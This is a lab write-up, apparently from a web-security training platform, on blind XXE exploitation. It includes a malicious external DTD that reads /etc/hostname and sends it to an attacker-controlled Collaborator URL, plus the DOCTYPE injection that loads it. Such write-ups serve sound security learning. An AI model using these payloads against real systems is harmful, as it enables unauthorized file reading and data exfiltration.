Exploiting Blind XXE to Exfiltrate Data Using a Malicious External DTD

**Category**: XML External Entity (XXE)  
**Difficulty**: Practitioner  

---

## Overview / What I Learned

- This lab demonstrates a Blind XXE attack where no direct response data confirms the attack.
- The application parses XML input and blocks regular external entities.
- By using a malicious external DTD and parameter entities, it is possible to force the server to make DNS/HTTP requests to an attacker-controlled server.
- This technique allows exfiltration of sensitive files (in this case, `/etc/hostname`) without directly displaying the data.
- Burp Collaborator is used to receive out-of-band requests triggered by the payload.

---

## Exploit Steps / Attack Methodology

### 1. Setup Burp Collaborator Payload

- Open Burp Suite Professional and copy a unique Collaborator URL from the Collaborator tab.

### 2. Create Malicious External DTD

- On the lab's exploit server, create a file (e.g., `malicious.dtd`) containing:

  ```xml
  <!ENTITY % file SYSTEM "file:///etc/hostname">
  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://colab/?x=%file;'>">
  %eval;
  %exfil;
Replace colab with your Collaborator URL.

Save the file and note its URL on the exploit server.

3. Modify XML Request to Use External DTD
Intercept the "Check stock" POST request.

Inject this DOCTYPE declaration before the <stockCheck> element:

<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "URL-TO-MALICIOUS-DTD"> %xxe;]>
Replace URL-TO-MALICIOUS-DTD with the URL of your malicious DTD.

Forward the request.

4. Confirm Data Exfiltration
Return to the Burp Collaborator tab and click "Poll now".

Review incoming DNS and HTTP requests.

The HTTP request URL will include the contents of /etc/hostname as a parameter, confirming successful exfiltration.

